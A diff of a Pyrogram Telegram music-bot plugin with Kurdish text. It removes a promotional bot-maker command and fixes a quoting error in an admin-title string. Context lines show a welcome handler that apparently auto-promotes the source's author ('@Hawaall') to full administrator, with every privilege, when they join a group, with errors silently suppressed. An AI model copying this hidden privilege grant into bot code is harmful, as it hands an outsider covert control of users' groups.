@@ -174,36 +174,6 @@ async def byyye(client, message):
 #__________________________________
 
 
-@Client.on_message(filters.command(["ڕێکخەری بۆت", "/bot","بۆتی گۆرانی","بۆت", "ڕێکخەر","/maker"], ""))
-async def huhh(client: Client, message: Message):
-    await message.reply_photo(
-        photo=f"https://graph.org/file/4eb53a4a6d8cba7efb4f9.jpg",
-        caption=f"""**● ڕێـكـخـەری بـۆتـی گـۆرانـی :\n⋆┄─┄─┄─┄─┄─┄─┄─┄⋆\n● بەخێربێی ئەزیزم {message.from_user.mention} 🕷️•\n● لە ڕێگای ئەم بۆتە دەتوانیت\n● بۆتی گۆرانی تایبەت بەخۆت دروستبکەیت\n● تایبەتمەندیەکانی بۆت\n● ڕێکڵام کردن، جۆینی ناچاری، گۆڕینی زانیاریەکانی بۆت\n● چالاککردن و ناچالاککردن\n● کۆنتڕۆڵکردنی ئەکاونتی یاریدەدەر**""",
-        reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "˹ᴍ ᴀ ᴋ ᴇ ꝛ ✗ ᴀ ʟ ɪ ɴ ᴀ˼", url=f"https://t.me/IQRXBOT"), 
-                 ],[
-                    
-                
-                    InlineKeyboardButton(
-                        "ڕێـكـخـەری بـۆتـی گـۆرانـی", url=f"https://t.me/IQRXBOT"),
-                ],[
-                    
-                    InlineKeyboardButton(
-                        "فێرکاری دروستکردن", url=f"https://t.me/MGIMT/639"),
-                ],[
-                    InlineKeyboardButton(
-                        "⧉• 𝙎𝙊𝙐𝙍𝘾𝞝 𝘼𝙇𝙄𝙉𝘼", url=f"https://t.me/MGIMT"),
-            
-                ],
-
-            ]
-
-        ),
-
-    )
 #########################
 @Client.on_message(filters.private)
 async def botoot(client: Client, message: Message):
@@ -244,7 +214,7 @@ async def welcome(client: Client, message):
          chat_id = message.chat.id
          user_id = message.new_chat_members[0].id
          await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
-         await client.set_administrator_title(chat_id, user_id, "𝐇𝐚𝐰𝐚𝐥𝐥🔥 ꨄᵉⁿᵈ"ᨒ")
+         await client.set_administrator_title(chat_id, user_id, "𝐇𝐚𝐰𝐚𝐥𝐥🔥 ꨄᵉⁿᵈᨒ")
       except:
         pass
       return await message.reply_text(f"**♪ خاوەنی سەرچاوە جۆینی گرووپ بوو 💎.\n♪ بەخێربێی : @Hawaall 💎.**")
